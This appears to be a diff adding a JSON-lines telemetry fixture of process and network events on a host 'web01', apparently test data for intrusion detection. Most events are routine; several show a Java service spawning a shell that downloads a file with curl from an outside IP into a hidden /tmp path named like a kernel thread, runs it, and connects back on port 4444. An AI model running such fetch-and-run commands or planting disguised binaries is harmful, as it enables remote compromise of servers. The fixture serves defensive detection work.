@@ -1,0 +1,14 @@
+{"type": "process", "ts": "2026-11-10T08:00:00Z", "host": "web01", "parent_image": "/usr/sbin/nginx", "image": "/usr/sbin/nginx", "cmdline": "nginx: worker process", "user": "www-data", "pid": "101", "ppid": "100"}
+{"type": "process", "ts": "2026-11-10T08:00:01Z", "host": "web01", "parent_image": "/usr/bin/java", "image": "/usr/bin/java", "cmdline": "java -jar app.jar", "user": "tomcat", "pid": "201", "ppid": "200"}
+{"type": "process", "ts": "2026-11-10T02:00:00Z", "host": "web01", "parent_image": "/usr/sbin/cron", "image": "/bin/sh", "cmdline": "/bin/sh -c /opt/backup.sh", "user": "root", "pid": "301", "ppid": "300"}
+{"type": "process", "ts": "2026-11-10T09:15:00Z", "host": "web01", "parent_image": "/usr/sbin/sshd", "image": "/bin/bash", "cmdline": "-bash", "user": "alice", "pid": "401", "ppid": "400"}
+{"type": "process", "ts": "2026-11-10T09:16:00Z", "host": "web01", "parent_image": "/bin/bash", "image": "/usr/bin/python3", "cmdline": "python3 manage.py check", "user": "alice", "pid": "402", "ppid": "401"}
+{"type": "network", "ts": "2026-11-10T08:01:00Z", "host": "web01", "image": "/usr/bin/java", "dst_ip": "10.0.0.5", "dst_port": "5432", "user": "tomcat", "pid": "201"}
+{"type": "network", "ts": "2026-11-10T08:02:00Z", "host": "web01", "image": "/usr/bin/java", "dst_ip": "198.51.100.20", "dst_port": "443", "user": "tomcat", "pid": "201"}
+{"type": "process", "ts": "2026-11-18T03:12:00Z", "host": "web01", "parent_image": "/usr/bin/java", "image": "/bin/sh", "cmdline": "/bin/sh -c curl -s http://203.0.113.9/x -o /tmp/.x/kworker", "user": "tomcat", "pid": "900", "ppid": "201"}
+{"type": "process", "ts": "2026-11-18T03:12:01Z", "host": "web01", "parent_image": "/bin/sh", "image": "/usr/bin/curl", "cmdline": "curl -s http://203.0.113.9/x -o /tmp/.x/kworker", "user": "tomcat", "pid": "901", "ppid": "900"}
+{"type": "network", "ts": "2026-11-18T03:12:01Z", "host": "web01", "image": "/usr/bin/curl", "dst_ip": "203.0.113.9", "dst_port": "80", "user": "tomcat", "pid": "901"}
+{"type": "process", "ts": "2026-11-18T03:12:05Z", "host": "web01", "parent_image": "/bin/sh", "image": "/tmp/.x/kworker", "cmdline": "/tmp/.x/kworker", "user": "tomcat", "pid": "902", "ppid": "900"}
+{"type": "network", "ts": "2026-11-18T03:12:06Z", "host": "web01", "image": "/tmp/.x/kworker", "dst_ip": "203.0.113.9", "dst_port": "4444", "user": "tomcat", "pid": "902"}
+{"type": "process", "ts": "2026-11-18T04:00:00Z", "host": "web01", "parent_image": "/usr/bin/java", "image": "/usr/bin/keytool", "cmdline": "keytool -list", "user": "tomcat", "pid": "950", "ppid": "201"}
+{"type": "network", "ts": "2026-11-18T04:01:00Z", "host": "web01", "image": "/usr/bin/java", "dst_ip": "203.0.113.50", "dst_port": "443", "user": "tomcat", "pid": "201"}
